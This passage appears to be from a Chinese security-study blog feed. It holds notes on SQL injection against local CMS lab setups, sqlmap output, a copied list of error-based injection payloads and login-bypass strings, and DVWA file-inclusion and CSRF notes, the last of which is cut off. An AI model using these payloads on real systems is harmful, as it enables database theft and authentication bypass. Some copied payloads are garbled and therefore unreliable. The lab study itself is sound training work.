&#x27;<span class="subst">$type</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$xs</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$cid</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$name</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$mail</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$url</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$touxiang</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$shebei</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$ip</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">$tz</span>&#x27;,</span></span><br><span class="line"><span class="string">    now()</span></span><br><span class="line"><span class="string">    )&quot;</span>;</span><br><span class="line"></span><br><span class="line">    @<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;新增错误：&#x27;</span>.<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">    <span class="comment"># 没有回显信息 </span></span><br><span class="line">    <span class="comment">#   -- 存在容错处理：or die(&#x27;新增错误：&#x27;.mysql_error());</span></span><br><span class="line">    <span class="comment">#   -- 套用报错语句注入点</span></span><br><span class="line"></span><br><span class="line">    该文件的对应访问形式： </span><br><span class="line">    <span class="comment"># 通过index.php获得下面访问形式(文件的包含执行)</span></span><br><span class="line">    http:<span class="comment">//127.0.0.1:8099/index.php?r=submit.php ==&gt; 要求有某些参数，考虑其它页面的调用来解决参数问题</span></span><br><span class="line"></span><br><span class="line">    路径：files/contacr.php</span><br><span class="line">    &lt;form  name=<span class="string">&quot;form&quot;</span> method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;/?r=submit&amp;type=message&quot;</span>&gt;</span><br><span class="line">    通过这个去提交到submit</span><br><span class="line"></span><br><span class="line">    书写办法：</span><br><span class="line">        http:<span class="comment">//127.0.0.1:8099?r=contacr</span></span><br><span class="line">        表单的姓名：<span class="string">&#x27; or updatexml(1,concat(0x7e,(version())),0) or &#x27;</span></span><br><span class="line">        其余随便写。</span><br><span class="line"></span><br><span class="line">        执行表单提交后达到这个效果：</span><br><span class="line">        <span class="comment"># 新增错误：XPATH syntax error: &#x27;~5.7.26&#x27;</span></span><br><span class="line"></span><br><span class="line">-- update更新数据</span><br><span class="line">    问题语句：</span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;UPDATE download SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    尝试注入：</span><br><span class="line">        http:<span class="comment">//127.0.0.1:8099/index.php?r=software&amp;cid=1%20and%20updatexml(1,concat(0x7e,(version())),1)</span></span><br><span class="line">    报错回显：</span><br><span class="line">        修改错误：XPATH syntax error: <span class="string">&#x27;~5.7.26&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">-- deleact删除数据</span><br><span class="line">    问题所在：</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">alert_back</span>(<span class="string">&#x27;默认会员组不能删除！&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$sql</span> = <span class="string">&#x27;delete from xtcms_user_group where ug_id = &#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>] . <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">alert_href</span>(<span class="string">&#x27;删除成功!&#x27;</span>, <span class="string">&#x27;cms_usergroup.php&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_ invoke__">alert_back</span>(<span class="string">&#x27;删除失败！&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    时间盲注：</span><br><span class="line">        尝试进行解决：（无法直接调用对应的文件，想要调用只能间接调用）</span><br><span class="line">            http:<span class="comment">//127.0.0.1:8098/admin/model/usergroup.php?del=2%20or%20if(1=1,sleep(5),0)</span></span><br><span class="line">            间接调用：</span><br><span class="line">            http:<span class="comment">//127.0.0.1:8098/admin/cms_usergroup.php?del=2%20or%20if(1=1,sleep(5),0)</span></span><br><span class="line">            查数据库名,并且使用Ascii码来绕过宽字节过滤</span><br><span class="line">            http:<span class="comment">//127.0.0.1:8098/admin/cms_usergroup.php?del=2%20or%20if(ord(left(database(),1))=107,sleep(5),0)    =&gt; 猜解第一位</span></span><br><span class="line">            http:<span class="comment">//127.0.0.1:8098/admin/cms_usergroup.php?del=2%20or%20if(ord(left(database(),2，1))=107,sleep(5),0) =&gt; 猜解第二位</span></span><br></pre></td></tr></table></figure><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当数据库名字长度为<span class="number">5</span>时，数据正常删除；</span><br><span class="line">当数据库名字长度非<span class="number">5</span>时，数据无法删除。</span><br><span class="line">http:<span class="comment">//127.0.0.1:8098/admin/cms_usergroup.php?del=2 and length(database())=5</span></span><br><span class="line">    =&gt; 正常回显删除</span><br></pre></td></tr></table></figure><h2 id="黑盒审计"><a href="#黑盒审计" class="headerlink" title="黑盒审计"></a>黑盒审计</h2><p>有验证码时，最好使用手工注入。如果验证码可以复用，那么可以使用sqlmap进行测试</p><p>主打工具注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post.txt放入抓到的数据包：</span><br><span class="line"></span><br><span class="line">GET /admin/cms_usergroup.php?del=<span class="number">2</span>* HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8098</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">109.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">114.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1:8098/admin/cms_usergroup.php</span></span><br><span class="line"><span class="comment">Cookie: admin_name=admin; admin_password=e10adc3949ba59abbe56e057f20f883e; </span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: navigate</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: none</span></span><br><span class="line"><span class="comment">Sec-Fetch-User: ?1</span></span><br></pre></td></tr></table></figure><p>使用sqlmap进行payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">慢速payload：</span><br><span class="line">Parameter: <span class="comment">#1* (URI)</span></span><br><span class="line">    Type: <span class="keyword">boolean</span>-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter <span class="title function_ invoke__">replace</span> (original value)</span><br><span class="line">    Payload: http:<span class="comment">//127.0.0.1:8098/admin/cms_usergroup.php?del=(SELECT (CASE WHEN (4497=4497) THEN 2 ELSE (SELECT 4650 UNION SELECT 6794) END))</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &lt; <span class="number">5.0</span>.<span class="number">12</span> AND time-based <span class="title function_ invoke__">blind</span> (BENCHMARK)</span><br><span class="line">    Payload: http:<span class="comment">//127.0.0.1:8098/admin/cms_usergroup.php?del=2 AND 2531=BENCHMARK(5000000,MD5(0x55595846))</span></span><br><span class="line">---------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">快速payload：http数据包进行注入，错误率高，信息详细。</span><br><span class="line">python sqlmap.py -r post.txt --dbs -v <span class="number">5</span></span><br><span class="line">[其中的部分回显]</span><br><span class="line"></span><br><span class="line">[<span class="number">20</span>:<span class="number">13</span>:<span class="number">19</span>] [TRAFFIC IN] HTTP response [<span class="comment">#635] (200 OK):</span></span><br><span class="line">Date: Sun, <span class="number">11</span> Jun <span class="number">2023</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">19</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">39</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">5.6</span>.<span class="number">9</span></span><br><span class="line">Expires: Thu, <span class="number">19</span> Nov <span class="number">1981</span> <span class="number">08</span>:<span class="number">52</span>:<span class="number">00</span> GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=<span class="number">0</span>, pre-check=<span class="number">0</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Connection: close</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line">URI: http:<span class="comment">//127.0.0.1:8098/admin/cms_usergroup.php?del=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28SELECT%20DISTINCT%28IFNULL%28CAST%28schema_name%20AS%20NCHAR%29%2C0x20%29%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%2061%2C1%29%2C7%2C1%29%29%3E1%29%20THEN%202%20ELSE%20%28SELECT%207731%20UNION%20SELECT%207961%29%20END%29%29</span></span><br><span class="line">[<span class="number">20</span>:<span class="number">13</span>:<span class="number">19</span>] [INFO] retrieved: zzzcms</span><br><span class="line">[<span class="number">20</span>:<span class="number">13</span>:<span class="number">19</span>] [DEBUG] performed <span class="number">40</span> queries in <span class="number">0.73</span> seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- delect 删除操作：(很危险，别瞎搞，小心进牢了)</span><br><span class="line">    黑盒测试当中，主要看前台是否有什么删除操作</span><br></pre></td></tr></table></figure><p>老师滴结论：延时操作YYDS！</p><h1 id="SQL注入相关的Mysql语法"><a href="#SQL注入相关的Mysql语法" class="headerlink" title="SQL注入相关的Mysql语法"></a>SQL注入相关的Mysql语法</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">like <span class="string">&#x27;ro%&#x27;</span>            <span class="comment">#判断ro或ro...是否成立 </span></span><br><span class="line">regexp <span class="string">&#x27;^xiaodi[a-z]&#x27;</span> <span class="comment">#匹配xiaodi及xiaodi...等</span></span><br><span class="line"><span class="keyword">if</span>(条件,<span class="number">5</span>,<span class="number">0</span>)           <span class="comment">#条件成立 返回5 反之 返回0</span></span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="number">5</span>)              <span class="comment">#SQL语句延时执行5秒</span></span><br><span class="line"><span class="title function_ invoke__">mid</span>(a,b,c)            <span class="comment">#从位置b开始，截取a字符串的c位</span></span><br><span class="line"><span class="title function_ invoke__">substr</span>(a,b,c)         <span class="comment">#从位置b开始，截取字符串a的c长度</span></span><br><span class="line"><span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>)，<span class="title function_ invoke__">database</span>() <span class="comment">#left(a,b)从左侧截取a的前b位</span></span><br><span class="line"><span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">database</span>())=<span class="number">8</span>  <span class="comment">#判断数据库database()名的长度</span></span><br><span class="line">ord=ascii <span class="title function_ invoke__">ascii</span>(x)=<span class="number">97</span> <span class="comment">#判断x的ascii码是否等于97</span></span><br><span class="line"></span><br><span class="line">SQL查询方式注入</span><br><span class="line">select,insert,update,delete,orderby等</span><br><span class="line"></span><br><span class="line">基本知识本地测试</span><br><span class="line"><span class="number">1</span>.模糊查询</span><br><span class="line">    查询username前俩字符为vi的username值</span><br><span class="line">    select * <span class="keyword">from</span> member where username like <span class="string">&#x27;vi%&#x27;</span>;</span><br><span class="line"><span class="number">2</span>.正则表达式查询</span><br><span class="line">    以x开头的username值</span><br><span class="line">    select * <span class="keyword">from</span> member where username regexp <span class="string">&#x27;^x&#x27;</span>;</span><br><span class="line"><span class="number">3</span>.延时注入</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">sleep</span>(<span class="number">1</span>);  <span class="comment">// 延迟注入，BP观察数据回显时间（有注入和没注入的时差）</span></span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>),<span class="number">0</span>);</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>&lt;<span class="number">2</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>),<span class="number">0</span>);</span><br><span class="line"><span class="number">4</span>.布尔注入</span><br><span class="line">    查数据库名的长度</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">database</span>())=<span class="number">7</span>;</span><br><span class="line">    查数据库名的第一个字符是否为p</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>)=<span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    查数据库名的前两个(从左边数起)字符是否为pi</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">database</span>(),<span class="number">2</span>)=<span class="string">&#x27;pi&#x27;</span>;</span><br><span class="line">    查数据库名的第<span class="number">1</span>个字符是否为p</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    查数据库名的第<span class="number">2</span>个字符是否为i</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">database</span>(),<span class="number">2</span>,<span class="number">1</span>)=<span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">    查数据库名的第<span class="number">1</span>个字符是否为p，不过是使用了ASCII编码进行识别，绕过宽字节</span><br><span class="line">    select * <span class="keyword">from</span> member where id=<span class="number">1</span> <span class="keyword">and</span> <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">left</span>(<span class="title function_ invoke__">database</span>(),<span class="number">1</span>))=<span class="number">112</span>;</span><br></pre></td></tr></table></figure><h1 id="12种报错注入-万能语句–博客资源"><a href="#12种报错注入-万能语句–博客资源" class="headerlink" title="12种报错注入+万能语句–博客资源"></a>12种报错注入+万能语句–博客资源</h1><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">博客文章原始地址点我(拷过来是防止文章没了……)</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">对应文章内容如下：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、通过floor报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> select <span class="number">1</span> <span class="keyword">from</span> (select <span class="title function_ invoke__">count</span>(),<span class="title function_ invoke__">concat</span>(<span class="title function_ invoke__">version</span>(),<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>)<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、通过ExtractValue报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">extractvalue</span>(<span class="number">1</span>, <span class="title function_ invoke__">concat</span>(<span class="number">0x5c</span>, (select table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、通过UpdateXml报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="title function_ invoke__">updatexml</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x3a</span>,(select <span class="title function_ invoke__">user</span>())),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、通过NAME_CONST报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">exists</span>(<span class="title function_ invoke__">selectfrom</span> (<span class="title function_ invoke__">selectfrom</span>(<span class="title function_ invoke__">selectname_const</span>(@@version,<span class="number">0</span>))a <span class="title function_ invoke__">join</span> (select <span class="title function_ invoke__">name_const</span>(@@version,<span class="number">0</span>))b)c)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、通过join报错,注入语句如下:</span><br><span class="line">select * <span class="keyword">from</span>(select * <span class="keyword">from</span> mysql.user ajoin mysql.user b)c;</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、通过exp报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">exp</span>(~(select * <span class="keyword">from</span> (select <span class="title function_ invoke__">user</span> () ) a) );</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、通过<span class="title function_ invoke__">GeometryCollection</span>()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">GeometryCollection</span>(()select *<span class="keyword">from</span>(select <span class="title function_ invoke__">user</span> () )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、通过<span class="title function_ invoke__">polygon</span> ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">polygon</span> (()select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span> ())a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>、通过<span class="title function_ invoke__">multipoint</span> ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">multipoint</span> (()select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>() )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、通过<span class="title function_ invoke__">multlinestring</span> ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">multlinestring</span> (()select * <span class="keyword">from</span>(<span class="title function_ invoke__">selectuser</span> () )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>、通过<span class="title function_ invoke__">multpolygon</span> ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">multpolygon</span> (()select * <span class="keyword">from</span>(<span class="title function_ invoke__">selectuser</span> () )a)b );</span><br><span class="line"></span><br><span class="line"><span class="number">12</span>、通过<span class="title function_ invoke__">linestring</span> ()报错,注入语句如下:</span><br><span class="line"><span class="keyword">and</span> <span class="title function_ invoke__">linestring</span> (()select * <span class="keyword">from</span>(select <span class="title function_ invoke__">user</span>() )a)b );</span><br><span class="line"></span><br><span class="line">关于POST注入</span><br><span class="line">常用的万能username语句：</span><br><span class="line">a <span class="string">&#x27; or 1=1 #</span></span><br><span class="line"><span class="string">a &quot;) or 1=1 #</span></span><br><span class="line"><span class="string">a‘) or 1=1 #</span></span><br><span class="line"><span class="string">a&quot; or &quot;1&quot;=&quot;1</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> (<span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">database</span>())) = <span class="number">8</span> (用于输入<span class="string">&#x27; &quot;都没有错误)</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> (<span class="title function_ invoke__">ascii</span>(<span class="title function_ invoke__">substr</span>((select <span class="title function_ invoke__">database</span>()) ,<span class="number">1</span>,<span class="number">1</span>))) = <span class="number">115</span> <span class="comment"># (用于输入&#x27; &quot;都没有错误)</span></span><br><span class="line"><span class="string">&quot;) or (&quot;</span><span class="number">1</span><span class="string">&quot;)=(&quot;</span><span class="number">1</span></span><br><span class="line"><span class="string">&quot;) or 1=1 or if(1=1, sleep(1), null) #</span></span><br><span class="line"><span class="string">&quot;</span>) <span class="keyword">or</span> (<span class="title function_ invoke__">length</span>(<span class="title function_ invoke__">database</span>())) = <span class="number">8</span> <span class="comment">#</span></span><br><span class="line"><span class="string">&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">post型盲注通杀payload：</span></span><br><span class="line"><span class="string">uname=admin%df&#x27;or()or%200%23&amp;passwd=&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关于UPDATEXML,REFERER,COOKIE的构造</span></span><br><span class="line"><span class="string">User-Agent:.........&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1),&quot;</span>,<span class="string">&quot;) #</span></span><br><span class="line"><span class="string">Referer: &#x27; or updatexml(1,concat(0x7e,database(),0x7e),1),&quot;</span>,<span class="string">&quot;) #</span></span><br><span class="line"><span class="string">Cookie:username: admin &#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">updatexml报错注入</span></span><br><span class="line"><span class="string">爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span></span><br><span class="line"><span class="string">链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span></span><br><span class="line"><span class="string">链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span></span><br><span class="line"><span class="string">爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</span></span><br><span class="line"><span class="string">爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</span></span><br><span class="line"><span class="string">爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</span></span><br><span class="line"><span class="string">爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-018-DVWA-File Inclusion</title>
      <link href="/2023/05/25/CTF-web-018/"/>
      <url>/2023/05/25/CTF-web-018/</url>
      
        <content type="html"><![CDATA[<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="comment">// 直接通过get传文件名的方式打开文件</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>特殊函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>()   当使用该函数包含文件时，只有代码执行到<span class="keyword">include</span>()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行</span><br><span class="line"><span class="keyword">include_once</span>()   功能和<span class="keyword">include</span>()相同，区别在于当重复调用同一文件时，程序只调用一次</span><br><span class="line"><span class="keyword">require</span>()   <span class="keyword">require</span>()与<span class="keyword">include</span>()的区别在于<span class="keyword">require</span>()执行如果发生错误，函数会输出错误信息，并终止脚本的运行 。使用<span class="keyword">require</span>()函数包含文件时，只要程序一执行，立即调用文件，而<span class="keyword">include</span>()只有程序执行到函数时才调用 .<span class="keyword">require</span>()在php程序执行前执行，会先读入 <span class="keyword">require</span> 所指定引入的文件，使它变成 PHP 程序网页的一部份。</span><br><span class="line"><span class="keyword">require_once</span>()   它的功能与<span class="keyword">require</span>()相同，区别在于当重复调用同一文件时，程序只调用一次</span><br></pre></td></tr></table></figure><p>文件包含漏洞：<br>文件包含指出</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-017-DVWA-CSRF</title>
      <link href="/2023/05/25/CTF-web-017/"/>
      <url>/2023/05/25/CTF-web-017/</url>
      
        <content type="html"><![CDATA[<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="comment">// 连接数据库的关键字符串，这是</span></span><br><span class="line">        <span class="comment">// 1.验证全局的连接字符$GLOBALS[&quot;___mysqli_ston&quot;]是否存在</span></span><br><span class="line">        <span class="comment">// 2.验证$GLOBALS[&quot;___mysqli_ston&quot;]是否为true(三木运算符)</span></span><br><span class="line">        <span class="comment">//      1.是，则使用mysqli_real_escape_string对新密码进行转义，预防注入攻击</span></span><br><span class="line">        <span class="comment">//      2.否，触发trigger_error用户自定义错误信息检测是否存在，无论是否存在都返回 &quot;&quot;</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="comment">// 加密</span></span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="comment">// 定义SQL查询语句</span></span><br><span class="line">        <span class="comment">// emmmmmm……没有身份判断逻辑，直接修改了密码(漏洞，致命错误)</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 数据库查询脚本</span></span><br><span class="line">        <span class="comment">// mysqli_query返回执行结果：是则返回执行结果，否则返回die报错信息</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span 